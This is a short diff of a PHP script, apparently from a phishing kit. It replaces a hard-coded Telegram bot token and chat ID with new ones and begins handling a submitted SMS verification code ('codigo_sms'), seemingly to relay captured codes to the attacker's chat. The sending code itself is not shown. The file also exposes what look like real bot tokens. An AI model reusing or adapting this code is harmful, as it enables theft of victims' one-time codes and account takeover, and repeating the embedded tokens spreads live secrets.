@@ -1,7 +1,7 @@
 <?php
 
-$token = "7799308908:AAFyAKoq4MawnnC5ddkm5hZgUi9qFWA08rw";
-$chat_id = "5157616506";
+$token = "7632972589:AAFRzRlHYr8nWKXTYj4w7TqLS4VLwV_XXns";
+$chat_id = "-1002365815581";
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $codigo_sms = isset($_POST['int1']) ? htmlspecialchars($_POST['int1']) : '';
